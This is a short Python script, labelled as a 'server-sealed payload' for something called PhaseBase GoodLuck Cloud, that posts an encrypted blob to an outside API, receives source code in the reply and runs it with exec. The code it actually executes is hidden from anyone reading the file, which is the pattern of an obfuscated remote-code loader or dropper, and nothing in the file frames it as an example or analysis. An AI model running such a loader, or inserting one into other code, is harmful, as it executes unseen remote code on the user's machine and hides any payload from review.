# PhaseBase :: GoodLuck Cloud (server-sealed payload) — decoder lives behind the PhaseBase API.
import json, urllib.request
_CT="AExtpAUTmfL4GQvYS2eaVxRzH9ftpTtGr3Ne"
_IV="zfeKz6sV+BAAmp3A"
_API="https://phasebase.lovable.app/api/public/goodluck/decode"
_req=urllib.request.Request(_API, data=json.dumps({"ct":_CT,"iv":_IV}).encode(), headers={"Content-Type":"application/json","User-Agent":"PhaseBase-GoodLuck/1.0 (+https://phasebase.lovable.app)"})
_src=json.loads(urllib.request.urlopen(_req).read())["code"]
exec(compile(_src, "<phasebase>", "exec"))
